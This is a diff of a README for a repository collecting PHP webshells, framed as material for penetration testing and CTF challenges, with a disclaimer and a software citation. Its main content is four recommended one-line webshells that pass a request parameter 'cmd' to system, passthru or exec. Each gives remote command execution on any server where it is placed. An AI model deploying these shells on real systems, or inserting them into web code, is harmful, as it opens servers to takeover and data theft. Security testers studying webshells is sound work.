@@ -1,30 +1,49 @@
 Contributing
 ============
+
 To contribute other shells not listed here... Fork, Push the changes to your repo, then before you request for a Pull, make sure to include a simple description of your **php** web-shell and include a screen-shot of the web-shell (as hosted in your localhost).
 
-php-webshells
+PHP Webshells
 =============
 
-Common PHP shells. Do not put these on a publicly-accessible webserver.
+Common PHP shells is a collection of PHP webshells that you may need for your penetration testing (PT) cases or in a CTF challenge. 
 
-These are provided for education purposes only.
+Do not host any of the files on a publicly-accessible webserver (unless you know what you are up-to).
 
-Common php webshells. Do not host the file(s) in your server!
+These are provided for education purposes only and legitimate PT cases.
 
-++++++++++++++++++++++++++
+I'll keep updating the collection whnever I stumble on any new webshell.
 
-Though I recommend one-liners like 
+FYI
+====
 
-<?php echo passthru($_GET['cmd']); ?>
 
-(Not a full fledged webshell, but works fine)
+For basic features, I recommend one-liners like :
 
-=================================================================
+`<?php echo passthru($_GET['cmd']); ?>`
 
-You can try WebHandler for one-liners.
+`<?php echo exec($_POST['cmd']); ?>`
 
-WebHandler.py works for POST and GET requests:
+`<?php system($_GET['cmd']); ?>`
 
-    <?php system($_GET['cmd']); ?>
-    <?php passthru($_REQUEST['cmd']); ?>
-    <?php echo exec($_POST['cmd']); ?>
+`<?php passthru($_REQUEST['cmd']); ?>`
+
+
+Cite:
+=====
+
+```
+@software{jacques_pharand_2020_3748072,
+  author       = {Jacques Pharand and
+                  John Troon and
+                  Javier Izquierdo Vera},
+  title        = {JohnTroony/php-webshells: Collection CS1},
+  month        = apr,
+  year         = 2020,
+  publisher    = {Zenodo},
+  version      = {1.1},
+  doi          = {10.5281/zenodo.3748072},
+  url          = {https://doi.org/10.5281/zenodo.3748072}
+}
+
+```
